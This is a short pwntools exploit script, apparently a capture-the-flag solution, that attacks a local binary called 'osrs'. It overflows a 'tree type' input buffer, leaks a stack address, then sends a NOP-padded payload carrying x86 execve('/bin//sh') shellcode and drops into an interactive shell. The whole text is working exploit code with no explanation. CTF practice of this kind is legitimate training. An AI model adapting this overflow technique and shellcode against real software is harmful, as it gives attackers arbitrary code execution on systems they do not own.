from pwn import *

r = process('./osrs')
raw_input('debug')

puts_got = 0x8049e80
printf_got = 0x8049e78
puts_ptl = 0x80483f0

main = 0x080485c8 

shellcode = '\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80'
buf = shellcode.ljust(0x110, '\x90') + p32(main) 
r.sendlineafter('Enter a tree type: ', buf)
r.recvuntil('have the tree ')
res = r.recv(8)
leak = int(res)
leak = leak + 2**32
log.info('leak %#x' %leak)

payload = 'a'*0x20 + shellcode
payload = payload.ljust(0x110, '\x90') + p32(leak)
r.sendlineafter('Enter a tree type: ', payload)

r.interactive()
r.close()

# FLAG
